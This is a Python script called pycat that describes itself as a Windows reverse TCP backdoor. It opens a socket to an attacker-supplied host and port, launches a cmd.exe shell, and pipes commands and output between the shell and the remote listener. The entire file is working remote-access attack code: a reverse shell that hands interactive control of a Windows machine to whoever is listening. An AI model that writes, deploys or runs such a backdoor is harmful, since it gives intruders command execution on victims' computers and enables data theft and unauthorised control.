import asyncio
import socket
import argparse

parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, 
                                 description="###############         pycat         ###############\n" \
                                             "          Windows Reverse TCP backdoor\n"
                                             "Usage: python pycat.py --host netcatIP --port PORT\n\n" \
                                             "Demo:    youtube.com/3sMhHL6c68E\n"\
											 "GitHub:  github.com/danielhnmoreno/pycat\n" \
                                             "Contact: contato@bluesafe.com.br")

parser.add_argument('--host', action = 'store', dest = 'host', required = True, help = 'Host listening for reverse connection')
parser.add_argument('--port', action = 'store', type=int, dest = 'port', required = True, help = 'Port')

arguments = parser.parse_args()

HOST = arguments.host
PORT = arguments.port


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

async def shell():
    while 1:
        proc = await asyncio.create_subprocess_shell("cmd",
                                                     stdin=asyncio.subprocess.PIPE,
                                                     stdout=asyncio.subprocess.PIPE,
                                                     stderr=asyncio.subprocess.STDOUT)
        cmd = b"\n"
        proc.stdin.write(cmd)

        while 1:
            while 1:
                out = await proc.stdout.readline()
                break_ = out.decode("latin-1")
                if break_[-2:] == ">\n" or break_[-3:] == "> \n":
                    s.send(out[:-1])
                    break
                elif break_.endswith(">" + cmd.decode()) or break_.endswith("> " + cmd.decode()):
                    pass
                else:
                    s.send(out)

            cmd = s.recv(1024)
            cmd_ = cmd.decode()
            if cmd_ == "\n":
                proc.stdin.write(b"\n")
            elif cmd_.startswith("exit"):
                proc.terminate()
                break
            else:
                proc.stdin.write(cmd + b"\n")

asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
asyncio.run(shell())